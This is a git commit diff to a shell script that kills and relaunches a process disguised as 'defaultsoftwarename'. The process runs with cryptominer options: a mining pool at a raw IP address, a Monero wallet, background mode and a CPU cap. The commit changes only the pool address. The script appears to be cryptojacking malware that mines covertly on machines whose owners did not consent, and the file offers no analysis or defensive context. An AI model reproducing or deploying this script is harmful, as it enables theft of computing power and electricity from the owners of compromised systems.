f2e5ea471f42aaad794f7d98d685ab250e39a4cf
tokdok <51758635+tokdok@users.noreply.github.com>
2019-06-14 14:53:08 +0000

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 92.246.76.89:47298 -u 4Aqy81L8Pcvi9vFxyaKWcoUD2a8XLYd3u9TMbWs6grPv4tXJVSjbEsAWK8NXTij9UZTCmcMwwLq9aLtugAjg2CeUD7hATJ9 --pass=x:waf_sw@vivaldi.net --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=74 --av=1 --variant -1
+defaultsoftwarename -o 81.22.45.66:53791 -u 4Aqy81L8Pcvi9vFxyaKWcoUD2a8XLYd3u9TMbWs6grPv4tXJVSjbEsAWK8NXTij9UZTCmcMwwLq9aLtugAjg2CeUD7hATJ9 --pass=x:waf_sw@vivaldi.net --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=74 --av=1 --variant -1
